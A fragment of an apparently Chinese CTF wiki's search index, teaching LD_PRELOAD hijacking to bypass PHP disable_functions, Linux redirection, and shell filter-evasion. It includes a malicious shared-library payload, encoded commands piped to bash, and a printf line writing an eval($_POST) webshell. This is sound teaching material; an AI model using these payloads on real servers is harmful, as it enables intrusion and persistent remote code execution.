LD_PRELOAD\u4ecb\u7ecd","text":"<p>\u5728UNIX\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4e16\u754c\u4e2d\uff0cLD_PRELOAD\u5c31\u662f\u8fd9\u6837\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5b83\u53ef\u4ee5\u5f71\u54cd\u7a0b\u5e8f\u7684\u8fd0\u884c\u65f6\u7684\u94fe\u63a5\uff08Runtimelinker\uff09\uff0c\u5b83\u5141\u8bb8\u4f60\u5b9a\u4e49\u5728\u7a0b\u5e8f\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u8fd9\u4e2a\u529f\u80fd\u4e3b\u8981\u5c31\u662f\u7528\u6765\u6709\u9009\u62e9\u6027\u7684\u8f7d\u5165\u4e0d\u540c\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u76f8\u540c\u51fd\u6570\u3002\u901a\u8fc7\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e3b\u7a0b\u5e8f\u548c\u5176\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4e2d\u95f4\u52a0\u8f7d\u522b\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u751a\u81f3\u8986\u76d6\u6b63\u5e38\u7684\u51fd\u6570\u5e93\u3002\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u529f\u80fd\u6765\u4f7f\u7528\u81ea\u5df1\u7684\u6216\u662f\u66f4\u597d\u7684\u51fd\u6570\uff08\u65e0\u9700\u522b\u4eba\u7684\u6e90\u7801\uff09\uff0c\u800c\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4ee5\u5411\u522b\u4eba\u7684\u7a0b\u5e8f\u6ce8\u5165\u6076\u610f\u7a0b\u5e8f\uff0c\u4ece\u800c\u8fbe\u5230\u90a3\u4e0d\u53ef\u544a\u4eba\u7684\u7f6a\u6076\u7684\u76ee\u7684\u3002</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u60f3\u8981\u5229\u7528LD_PRELOAD\u73af\u5883\u53d8\u91cf\u7ed5\u8fc7disable_functions\u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u51e0\u70b9</p> <pre><code>\u80fd\u591f\u4e0a\u4f20\u81ea\u5df1\u7684.so\u6587\u4ef6\n\n\u80fd\u591f\u63a7\u5236\u73af\u5883\u53d8\u91cf\u7684\u503c\uff08\u8bbe\u7f6eLD_PRELOAD\u53d8\u91cf\uff09\uff0c\u6bd4\u5982putenv\u51fd\u6570\n\n\u5b58\u5728\u53ef\u4ee5\u63a7\u5236PHP\u542f\u52a8\u5916\u90e8\u7a0b\u5e8f\u7684\u51fd\u6570\u5e76\u80fd\u6267\u884c\uff08\u56e0\u4e3a\u65b0\u8fdb\u7a0b\u542f\u52a8\u5c06\u52a0\u8f7dLD_PRELOAD\u4e2d\u7684.so\u6587\u4ef6\uff09\uff0c\u6bd4\u5982mail()\u3001imap_mail()\u3001mb_send_mail()\u548cerror_log()\u7b49\nPlain Text\n</code></pre>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#_4","title":"\u6d41\u7a0b","text":"<p>\u4e0b\u9762\u662f\u5177\u4f53\u6f0f\u6d1e\u6267\u884c\u7684\u6d41\u7a0b\uff1a</p> <ol> <li> <p>\u9996\u5148\uff0c\u6211\u4eec\u80fd\u591f\u4e0a\u4f20\u6076\u610f<code>.so</code>\u6587\u4ef6\uff0c<code>.so\u6587\u4ef6</code>\u7531\u653b\u51fb\u8005\u5728\u672c\u5730\u4f7f\u7528\u4e0e\u670d\u52a1\u7aef\u76f8\u8fd1\u7684\u7cfb\u7edf\u73af\u5883\u8fdb\u884c\u7f16\u8bd1\uff0c\u8be5\u5e93\u4e2d\u91cd\u5199\u4e86\u76f8\u5173\u7cfb\u7edf\u51fd\u6570\uff0c\u91cd\u5199\u7684\u7cfb\u7edf\u51fd\u6570\u80fd\u591f\u88abPHP\u4e2d\u672a\u88abdisable_functions\u7981\u6b62\u7684\u51fd\u6570\u6240\u8c03\u7528\u3002\u8fd9\u4e00\u73af\u8282\u6709\u70b9\u50cf\u6c47\u7f16\u91cc\u9762\u7684link\u64cd\u4f5c\u5c06\u4e0a\u4f20\u7684.so\u52a8\u6001\u94fe\u63a5\u5e93\u3002\uff08\u76f8\u5f53\u4e8e\u4e00\u6bb5\u6c47\u7f16\u4ee3\u7801\u94fe\u63a5\u4e0a\u4ed6\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff09</p> </li> <li> <p>\u5f53\u6211\u4eec\u80fd\u591f\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u6bd4\u5982putenv\u51fd\u6570\u672a\u88ab\u7981\u6b62\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u628aLD_PRELOAD\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u6076\u610f.so\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u53ea\u8981\u542f\u52a8\u65b0\u7684\u8fdb\u7a0b\u5c31\u4f1a\u5728\u65b0\u8fdb\u7a0b\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u8be5\u6076\u610f.so\u6587\u4ef6\uff0c\u7531\u6b64\uff0c\u6076\u610f\u4ee3\u7801\u5c31\u88ab\u6ce8\u5165\u5230\u7a0b\u5e8f\u4e2d\u3002</p> </li> </ol> <p>\u4e0b\u9762\u7a0d\u5fae\u6ce8\u91ca\u4e00\u4e0b\uff1a\u8fd9\u91cc\u7684putenv\u51fd\u6570\uff1a</p> <p></p> <p></p> <p>\u589e\u52a0\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u3002</p> <p>\u5f53\u6267\u884c\u672a\u88ab\u7981\u6b62\u7684PHP\u51fd\u6570\uff0c\u5e76\u4e14\u8be5\u51fd\u6570\u8c03\u7528\u4e86\u6076\u610f\u5e93\u4e2d\u91cd\u5199\u7684\u7cfb\u7edf\u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u6548\u679c\u4e86\uff0c\u56e0\u4e3a\u91cd\u5199\u7684\u7cfb\u7edf\u51fd\u6570\u4e2d\u7684\u5185\u5bb9\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u5bf9\u8fd9\u90e8\u5206\u5185\u5bb9\u8fdb\u884c\u7f16\u7a0b\u5373\u53ef\u3002</p> <p>PHP\u4e2d\u67d0\u4e9b\u51fd\u6570\u6bd4\u5982mail()\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528\u7cfb\u7edf\u4e2d\u7684sendmail\u51fd\u6570\uff0c\u7531\u4e8eLD_PRELOAD\u4e2d\u6307\u5b9a\u52a0\u8f7d\u4e86\u6076\u610f\u7684.so\u6587\u4ef6\u4e2d\u8986\u76d6\u4e86sendmail\u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u4f1a\u6267\u884c\u91cd\u5199\u7684sendmail\u51fd\u6570\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u7ed5\u8fc7disable_functions\uff0c\u8fbe\u5230\u4efb\u610f\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u6548\u679c\u3002</p> <p></p> <p>\u4e3e\u4e2a\u4f8b\u5b50</p> <p></p> <p>\u9996\u5148\u67e5\u770bsendmail\u8fd9\u4e00\u7cfb\u7edf\u51fd\u6570\u4f1a\u8c03\u7528\u54ea\u4e9b\u5e93\u51fd\u6570</p> <p>readelf -Ws /usr/sbin/sendmail</p> <p>\u4ece\u8fd9\u4e9b\u5e93\u51fd\u6570\u4e2d\u9009\u62e9\u4e00\u4e2a\u5408\u9002\u7684\u5373\u53ef\uff0c\u8fd9\u91cc\u9009\u53d6seteuid()\u6765\u8fdb\u884c\u91cd\u5199</p> <p></p> <p>\u91cd\u5199\u7684\u51fd\u6570\uff1a</p> <pre><code>   #include &lt;stdlib.h&gt;\n   #include &lt;stdio.h&gt;\n   #include &lt;string.h&gt;\n\n\n    void payload() {\n           system(\"touch /var/www/html/success\");\n    }\n\n\n   int  seteuid() {\n       if (getenv(\"LD_PRELOAD\") == NULL) { return 0; }\n       unsetenv(\"LD_PRELOAD\");\n       payload();\n    }\nPlain Text\n</code></pre> <p>\uff08\u5982\u679c\u60f3\u521b\u5efa\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u53ef\u4ee5\u4f7f\u7528 GCC \u7684-shared\u9009\u9879\u3002\u8f93\u5165\u6587\u4ef6\u53ef\u4ee5\u662f\u6e90\u6587\u4ef6\u3001\u6c47\u7f16\u6587\u4ef6\u6216\u8005\u76ee\u6807\u6587\u4ef6\u3002\u53e6\u5916\u8fd8\u5f97\u7ed3\u5408-fPIC\u9009\u9879\u3002-fPIC \u9009\u9879\u4f5c\u7528\u4e8e\u7f16\u8bd1\u9636\u6bb5\uff0c\u544a\u8bc9\u7f16\u8bd1\u5668\u4ea7\u751f\u4e0e\u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801\uff08Position-Independent Code\uff09\uff1b\u8fd9\u6837\u4e00\u6765\uff0c\u4ea7\u751f\u7684\u4ee3\u7801\u4e2d\u5c31\u6ca1\u6709\u7edd\u5bf9\u5730\u5740\u4e86\uff0c\u5168\u90e8\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff0c\u6240\u4ee5\u4ee3\u7801\u53ef\u4ee5\u88ab\u52a0\u8f7d\u5668\u52a0\u8f7d\u5230\u5185\u5b58\u7684\u4efb\u610f\u4f4d\u7f6e\uff0c\u90fd\u53ef\u4ee5\u6b63\u786e\u7684\u6267\u884c\u3002\u8fd9\u6b63\u662f\u5171\u4eab\u5e93\u6240\u8981\u6c42\u7684\uff0c\u5171\u4eab\u5e93\u88ab\u52a0\u8f7d\u65f6\uff0c\u5728\u5185\u5b58\u7684\u4f4d\u7f6e\u4e0d\u662f\u56fa\u5b9a\u7684\u3002\u4f60\u8981\u6839\u636e\u76ee\u6807\u67b6\u6784\u7f16\u8bd1\u6210\u4e0d\u540c\u7248\u672c\uff0c\u5728 x64 \u7684\u73af\u5883\u4e2d\u7f16\u8bd1\uff0c\u82e5\u4e0d\u5e26\u7f16\u8bd1\u9009\u9879\u5219\u9ed8\u8ba4\u4e3a x64\uff0c\u82e5\u8981\u7f16\u8bd1\u6210 x86 \u67b6\u6784\u9700\u8981\u52a0\u4e0a -m32 \u9009\u9879\u3002)</p> <p>\u4e0a\u4f20.so\u6587\u4ef6</p> <p>\u5199\u5165webshell</p> <pre><code>test2.php   &lt;?php\n   putenv(\"LD_PRELOAD=/var/www/hack.so\");\n   mail(\"[emailprotected]\",\"\",\"\",\"\",\"\");\n?&gt;\n\u8fd9\u91cc\u662f\u76f8\u5f53\u4e8e\u5411\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u5199\u5165\u8be5.so\u6587\u4ef6\u7684\u8def\u5f84\nPlain Text\n</code></pre> <p>\u56de\u5230LD_PRELOAD \u672c\u8eab\uff0c\u7cfb\u7edf\u901a\u8fc7\u5b83\u9884\u5148\u52a0\u8f7d\u5171\u4eab\u5bf9\u8c61\uff0c\u5982\u679c\u80fd\u627e\u5230\u4e00\u4e2a\u65b9\u5f0f\uff0c\u5728\u52a0\u8f7d\u65f6\u5c31\u6267\u884c\u4ee3\u7801\uff0c\u800c\u4e0d\u7528\u8003\u8651\u52ab\u6301\u67d0\u4e00\u7cfb\u7edf\u51fd\u6570\uff0c\u6bd4\u5982geteuid\uff08\uff09\u3002</p> <p>\u5728GCC \u6709\u4e2a C \u8bed\u8a00\u6269\u5c55\u4fee\u9970\u7b26 attribute((constructor))\uff0c\u53ef\u4ee5\u8ba9\u7531\u5b83\u4fee\u9970\u7684\u51fd\u6570\u5728main() \u4e4b\u524d\u6267\u884c\uff0c\u82e5\u5b83\u51fa\u73b0\u5728\u5171\u4eab\u5bf9\u8c61\u4e2d\u65f6\uff0c\u90a3\u4e48\u4e00\u65e6\u5171\u4eab\u5bf9\u8c61\u88ab\u7cfb\u7edf\u52a0\u8f7d\uff0c\u7acb\u5373\u5c06\u6267\u884c__attribute__((constructor))\u4fee\u9970\u7684\u51fd\u6570\u3002</p> <p>attribute((constructor))</p> <p>constructor\u53c2\u6570\u8ba9\u7cfb\u7edf\u6267\u884cmain()\u51fd\u6570\u4e4b\u524d\u8c03\u7528\u51fd\u6570(\u88ab__attribute__((constructor))\u4fee\u9970\u7684\u51fd\u6570)</p> <p>attribute((destructor))</p> <p>destructor\u53c2\u6570\u8ba9\u7cfb\u7edf\u5728main()\u51fd\u6570\u9000\u51fa\u6216\u8005\u8c03\u7528\u4e86exit()\u4e4b\u540e,(\u88ab__attribute__((destructor))\u4fee\u9970\u7684\u51fd\u6570)</p> <p>\u56e0\u6b64\uff0c\u53ea\u8981php\u4e2d\u8bbe\u7f6e\u4e86LD_PRELOAD\uff0c\u5e76\u6d3e\u751f\u4e86\u65b0\u7684\u8fdb\u7a0b\uff0c\u5c06\u4f1a\u6267\u884cLD_PRELOAD\u7684\u6587\u4ef6\u4e2d__attribute__((constructor))\u91cc\u7684\u51fd\u6570(\u8fd9\u4e2a\u662f\u8fd9\u91cc\u7684\u539f\u7406\uff0c\u4e0e\u51fd\u6570\u8c03\u7528\u52a0\u8f7d\u7684\u8fc7\u7a0b\u6709\u5173\uff0c\u5e94\u8be5\u80fd\u770b\u61c2)</p> <pre><code>test3.c\n\n   #include &lt;stdlib.h&gt;\n   #include &lt;string.h&gt;\n   __attribute__((constructor))void payload() {\n       unsetenv(\"LD_PRELOAD\");\n       const char* cmd = getenv(\"CMD\");\n       system(cmd);\n    }\n\ntest2.php\n\n   &lt;?php\n   putenv(\"CMD=ls\");\n   putenv(\"LD_PRELOAD=./test3_x64.so\");\n   error_log(\"a\",1);\n   ?&gt;\nPlain Text\n</code></pre> <p>\u7136\u540e\u8c03\u7528\u4fee\u6539\u540e\u7684\u51fd\u6570\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#2019-0ctftctf-wallbreaker-easy","title":"2019 0CTF/TCTF wallbreaker easy","text":"<p>\u9898\u76ee\u7406\u89e3\uff1a\u8fd9\u91cc\u7ed9\u4e86\u4f60\u6728\u9a6c\uff0c\u53ef\u4ee5\u5f88\u5feb\u7684\u8fde\u63a5\u4e0a\u5b83\u7684\u670d\u52a1\u5668\uff0c\u5176\u4ed6\u7684\u90fd\u662f\u6743\u9650\u4e0d\u591f\uff0c\u4f60\u53ea\u80fd\u8bbf\u95ee/var/www/html\u548c/tmp/sajdhashdoahodsaodhsahjdh(\u5c31\u662f\u5f88\u957f)\u800c\u4e14\u80fd\u591f\u5728\u540e\u9762\u8fdb\u884c\u6587\u4ef6\u4e0a\u4f20\u3002</p> <p>\u90a3\u4e48\u5173\u952e\u5c31\u5728\u8fd9\u91cc\u7684\u6587\u4ef6\u4e0a\u4f20\uff0c\u6211\u4e48\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e0a\u4e0a\u4f20.so\u6587\u4ef6\uff0c\u8fd9\u4e2aso\u6587\u4ef6\u4fee\u6539\u51fd\u6570\u7684\u5185\u5bb9\u5219\u662f\u5728\u4ee3\u7801\u5ba1\u8ba1\u4e2d\u6240\u63d0\u5230\u7684ImageMagick\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4f1a\u8fde\u63a5\u5230\u5916\u9762\u7684\u52a8\u6001\u5e93\uff0c\u7136\u540e\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u5229\u7528putenv\u51fd\u6570\u5c06\u6211\u4eec\u4fee\u6539\u7684\u5305\u542b\u5728ImageMagick\u4e2d\u7684\u51fd\u6570\u653e\u5230\u73af\u5883\u53d8\u91cf\u4e4b\u4e2d\uff0c\u7136\u540e\u6211\u4eec\u63d0\u4ea4\u968f\u610f\u4e00\u5f20\u56fe\u7247\uff0c\u8ba9\u7a0b\u5e8f\u81ea\u52a8\u8c03\u7528ImageMagic\uff0c\u7136\u540e\u53c8\u4f1a\u7531\u4e8eLD_preload\u5c06\u90a3\u4e2a\u67d0\u4e2a\u51fd\u6570\u66ff\u6362\u6210\u6211\u4eec\u5148\u524d\u4fee\u6539\u7684\u540c\u540d\u51fd\u6570\uff0c\u4ece\u800c\u8fbe\u5230\u7ed5\u8fc7destruct_function.</p> <pre><code>$a=new Imagick();$a-&gt;readImage('123.png');$a-&gt;writeImage('sad.wdp');  //\u89e6\u53d1\u65b0\u8fdb\u7a0b\nPlain Text\n</code></pre> <p>\u7f16\u8bd1\u6210.so\u6587\u4ef6\u540e\u4e0a\u4f20</p> <p>\u7136\u540e\u518d\u4e0a\u4f20\u4e00\u5f20\u56fe\u7247\uff0c\u4e4b\u540e\u7531\u4e8e\u81ea\u52a8\u8c03\u7528\uff0c\u5b8c\u6210\u4ee3\u7801\u6267\u884c</p> <p>\u81f3\u4e8e\u4e0d\u9700\u8981\u6280\u5de7\u7684\u64cd\u4f5c\uff1a</p> <p>\u8681\u5251\u4e0a\u6709\u7ed5\u8fc7destruct_function\u7684\u63d2\u4ef6</p> <p>\u539f\u7406\u5728\u5b98\u7f51\u4e0a\u548c\u8fd9\u4e2a\u662f\u4e00\u6837\u7684,\u90fd\u662fld_preload\u51fd\u6570\u52ab\u6301\u3002</p> <p>\u4e0b\u8f7d\u63d2\u4ef6\u6253\u5f00\u5373\u53ef\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"web/linux/linux%E7%AE%A1%E9%81%93%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/","title":"linux\u7ba1\u9053\u7b26\u4e0e\u91cd\u5b9a\u5411","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u7ba1\u9053\u7b26\u5728\u6bd4\u8d5b\u4e2d\u5176\u5b9e\u8fc7\u6ee4\u7684\u6bd4\u8f83\u591a\uff0c\u4f46\u662f\u6ca1\u6709\u8fc7\u6ee4\u6389\u7684\u7ba1\u9053\u7b26\u5f80\u5f80\u5374\u53c8\u662f\u8003\u5bdf\u70b9</p> <p>\u4ee5\u4e0b\u5185\u5bb9\u5168\u90e8\u90fd\u4e0d\u662f\u539f\u521b</p> <p>1\uff0c\u591a\u547d\u4ee4\u6267\u884c\u7b26\u2019</p> <p></p> <p>\u4f8b\uff1als;date;pwd \u4f1a\u6309\u7167\u987a\u5e8f\u4f9d\u6b21\u6267\u884c</p> <p>ls &amp;&amp; echo yes || echo no</p> <p>ls\u547d\u4ee4\u6267\u884c\u6b63\u786e\u6253\u5370yes\u6267\u884c\u9519\u8bef\u6253\u5370no</p> <p>Linux\u4e4b\u7ba1\u9053\u7b26</p> <p></p> <p>\u4f8b\uff1aps aux | grep nginx</p> <p>\u547d\u4ee41: \uff08ps aux\uff09ps\u547d\u4ee4\u5c31\u662f\u6700\u57fa\u672c\u8fdb\u7a0b\u67e5\u770b\u547d\u4ee4\uff0c-a \uff1a \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u8fdb\u7a0b\uff0c\u5305\u62ec\u5176\u4ed6\u7528\u6237\u7684\u8fdb\u7a0b\uff1b</p> <p>-u \uff1a\u4ee5\u7528\u6237\u4e3a\u4e3b\u7684\u8fdb\u7a0b\u72b6\u6001 \uff1bx \uff1a\u901a\u5e38\u4e0e a \u8fd9\u4e2a\u53c2\u6570\u4e00\u8d77\u4f7f\u7528\uff0c\u53ef\u5217\u51fa\u8f83\u5b8c\u6574\u4fe1\u606f\u3002</p> <p>\u547d\u4ee42\uff1a\uff08grep nginx\uff09\u4eceps aux\u6267\u884c\u7ed3\u679c\u4e2d\u5bfb\u627e\u542b\u6709nginx\u7684\u884c</p> <p>linux\u91cd\u5b9a\u5411</p> <pre><code>1.1      \u91cd\u5b9a\u5411\u7b26\u53f7\n&gt;               \u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6\n&gt;!              \u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u5f3a\u5236\u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6\n&gt;&gt;             \u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8ffd\u52a0\u539f\u6765\u7684\u6587\u4ef6\n&lt;               \u8f93\u5165\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u7a0b\u5e8f \n1.2\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u7b26\u53f7\n2&gt;             \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6  b-shell\n2&gt;&gt;           \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8ffd\u52a0\u5230\u539f\u6765\u7684\u6587\u4ef6\n2&gt;&amp;1         \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa \u6ce8\u91ca:1 \u53ef\u80fd\u5c31\u662f\u4ee3\u8868 \u6807\u51c6\u8f93\u51fa\n&gt;&amp;             \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6  c-shell\n|&amp;              \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef \u7ba1\u9053 \u8f93\u9001 \u5230\u53e6\u4e00\u4e2a\u547d\u4ee4\u4f5c\u4e3a\u8f93\u5165\n1.3\u547d\u4ee4\u91cd\u5bfc\u5411\u793a\u4f8b\n\u5728 bash \u547d\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e3b\u8981\u6709\u4e09\u79cd\u8f93\u51fa\u5165\u7684\u72b6\u51b5\uff0c\u5206\u522b\u662f\uff1a\n1. \u6807\u51c6\u8f93\u5165\uff1b\u4ee3\u7801\u4e3a 0 \uff1b\u6216\u79f0\u4e3a stdin \uff1b\u4f7f\u7528\u7684\u65b9\u5f0f\u4e3a &lt;\n2. \u6807\u51c6\u8f93\u51fa\uff1a\u4ee3\u7801\u4e3a 1 \uff1b\u6216\u79f0\u4e3a stdout\uff1b\u4f7f\u7528\u7684\u65b9\u5f0f\u4e3a 1&gt;\n3. \u9519\u8bef\u8f93\u51fa\uff1a\u4ee3\u7801\u4e3a 2 \uff1b\u6216\u79f0\u4e3a stderr\uff1b\u4f7f\u7528\u7684\u65b9\u5f0f\u4e3a 2&gt;\n[test @test test]# ls -al &gt; list.txt\n\u5c06\u663e\u793a\u7684\u7ed3\u679c\u8f93\u51fa\u5230 list.txt \u6587\u4ef6\u4e2d\uff0c\u82e5\u8be5\u6587\u4ef6\u4ee5\u5b58\u5728\u5219\u4e88\u4ee5\u53d6\u4ee3\uff01\n[test @test test]# ls -al &gt;&gt; list.txt\n\u5c06\u663e\u793a\u7684\u7ed3\u679c\u7d2f\u52a0\u5230 list.txt \u6587\u4ef6\u4e2d\uff0c\u8be5\u6587\u4ef6\u4e3a\u7d2f\u52a0\u7684\uff0c\u65e7\u6570\u636e\u4fdd\u7559\uff01\n[test @test test]# ls -al  1&gt; list.txt   2&gt; list.err\n\u5c06\u663e\u793a\u7684\u6570\u636e\uff0c\u6b63\u786e\u7684\u8f93\u51fa\u5230 list.txt \u9519\u8bef\u7684\u6570\u636e\u8f93\u51fa\u5230 list.err\n[test @test test]# ls -al 1&gt; list.txt 2&gt; &amp;1\n\u5c06\u663e\u793a\u7684\u6570\u636e\uff0c\u4e0d\u8bba\u6b63\u786e\u6216\u9519\u8bef\u5747\u8f93\u51fa\u5230 list.txt \u5f53\u4e2d\uff01\u9519\u8bef\u4e0e\u6b63\u786e\u6587\u4ef6\u8f93\u51fa\u5230\u540c\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u5219\u5fc5\u987b\u4ee5\u4e0a\u9762\u7684\u65b9\u6cd5\u6765\u5199\uff01\u4e0d\u80fd\u5199\u6210\u5176\u5b83\u683c\u5f0f\uff01[test @test test]# ls -al 1&gt; list.txt 2&gt; /dev/null\n\u5c06\u663e\u793a\u7684\u6570\u636e\uff0c\u6b63\u786e\u7684\u8f93\u51fa\u5230 list.txt \u9519\u8bef\u7684\u6570\u636e\u5219\u4e88\u4ee5\u4e22\u5f03\uff01 /dev/null \uff0c\u53ef\u4ee5\u8bf4\u6210\u662f\u9ed1\u6d1e\u88c5\u7f6e\u3002\u4e3a\u7a7a\uff0c\u5373\u4e0d\u4fdd\u5b58\u3002\nPlain Text\n</code></pre> <p>\u5176\u5b9e\u4e5f\u633a\u597d\u8bb0\u7684,\u5c31\u50cf\u4e00\u4e2a\u7bad\u5934\u4e00\u6837</p> <p>\u8fd8\u53ef\u4ee5\u7528\u7ba1\u9053\u7b26\u6765\u521b\u5efa\u6587\u4ef6echo xxx &gt;1.txt</p>"},{"location":"web/linux/linux%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/","title":"linux\u7ed5\u8fc7\u59ff\u52bf","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u62fc\u63a5\u7ed5\u8fc7</p> <pre><code>#\u6267\u884cls\u547d\u4ee4\uff1a\na=l;b=s;$a$b\n#cat flag\u6587\u4ef6\u5185\u5bb9\uff1a\na=c;b=at;c=f;d=lag;$a$b${c}${d}\n#cat test\u6587\u4ef6\u5185\u5bb9\na=\"ccaatt\";b=${a:0:1}${a:2:1}${a:4:1};$btest\nPlain Text\n</code></pre> <p>\u7f16\u7801\u7ed5\u8fc7</p> <pre><code>#base64\necho \"Y2F0IC9mbGFn\"|base64 -d|bash ==&gt;cat /flag\necho Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag\n#hex\necho \"0x636174202f666c6167\" | xxd -r -p|bash ==&gt;cat /flag\n#oct/\u5b57\u8282\n$(printf \"\\154\\163\") ==&gt;ls\n$(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\") ==&gt;cat /flag\n{printf,\"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\"}|\\$0 ==&gt;cat /flag\n\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u5199\u9a6c\n\u5185\u5bb9\u4e3aphp @eval($_POST['c']);?&gt;\n${printf,\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"} &gt;&gt; 1.php\u3002\n\nPlain Text\n</code></pre> <p>\u6b63\u5219\u5339\u914d</p> <pre><code>cat t?st\ncat te*\ncat t[a-z]st\ncat t{a,b,c,d,e,f}st\nPlain Text\n</code></pre> <p>\u5f02\u6216\u7ed5\u8fc7\uff08linux\u53ef\u4ee5\u8fd9\u4e48\u7528\uff0c\u4f46\u8fd9\u91cc\u5e94\u8be5\u4e0d\u662flinux\uff09</p> <pre><code>var_dump('#'^'|'); //\u5f97\u5230\u5b57\u7b26 _\nvar_dump('.'^'~'); //\u5f97\u5230\u5b57\u7b26 P\nvar_dump('/'^'`'); //\u5f97\u5230\u5b57\u7b26 0\nvar_dump('|'^'/'); //\u5f97\u5230\u5b57\u7b26 S\nvar_dump('{'^'/'); //\u5f97\u5230\u5b57\u7b26 T\n$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\"); //\u53d8\u91cf$__\u503c\u4e3a\u5b57\u7b26\u4e32'_POST'\nPlain Text\n</code></pre> <pre><code>#\u7ed9\u51fa\u811a\u672cif __name__ == \"__main__\":\nfor i in range(0,127):\nfor j in range(0,127):\nresult=i^j\nif(chr(result) is '\u60f3\u8981\u7684\u5b57\u7b26'):\nprint(' '+chr(i)+' xor '+chr(j)+' == '+chr(result))\u7f29\u8fdb\u81ea\u5df1\u6765\nPlain Text\n</code></pre>"},{"location":"web/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/","title":"Web\u5e38\u7528linux\u8def\u5f84","text":"<p>web\u5e38\u7528linux\u8def\u5f84:</p> <p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>1./etc/passwd</p> <p>2./etc/hosts</p> <p>3./proc/net/arp</p> 